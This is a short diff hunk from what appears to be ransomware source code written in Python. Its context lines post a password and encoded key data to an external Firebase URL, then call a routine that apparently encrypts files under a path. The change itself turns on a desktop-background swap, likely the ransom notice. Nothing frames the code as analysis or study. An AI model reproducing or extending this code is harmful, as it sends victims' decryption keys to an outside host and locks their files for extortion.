@@ -70,7 +70,7 @@ base2 = base.decode('latin-1')
 firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
 result = firebase.post('/user' + '/' + password2, {"Base" : base2})
 
-#change_bg()
+change_bg()
 
 print("encoding")
 search_enc(testPath)
